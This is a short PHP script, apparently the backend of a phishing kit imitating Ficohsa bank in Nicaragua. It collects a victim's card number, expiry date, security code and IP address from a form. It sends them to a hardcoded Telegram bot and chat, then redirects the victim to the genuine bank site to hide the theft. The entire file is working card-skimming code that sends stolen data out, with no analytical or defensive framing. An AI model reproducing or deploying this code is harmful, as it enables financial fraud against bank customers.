<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener los datos del formulario
    $tarj = $_POST['tarj'];
    $fecha = $_POST['fecha'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];

    // Configurar el token y el ID del chat
    $token = '7632972589:AAFRzRlHYr8nWKXTYj4w7TqLS4VLwV_XXns';
    $chat_id = '-1002365815581';

    // Crear el mensaje
    $message = "FICOSHA TARJET:
    \nTarjeta: {$tarj}\nFecha de vencimiento: {$fecha}\nCódigo de seguridad: {$pass}\nIP: {$ip}";

    // Enviar el mensaje a través de la API de Telegram
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chat_id,
        'text' => $message
    );
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result !== false) {
        // Mensaje enviado correctamente
        // Redirigir a otra página
        header("Location: https://www.ficohsa.com/ni/");
        exit();
    } else {
        // Error al enviar el mensaje
        echo "Error al enviar el mensaje a Telegram.";
    }
}
?>
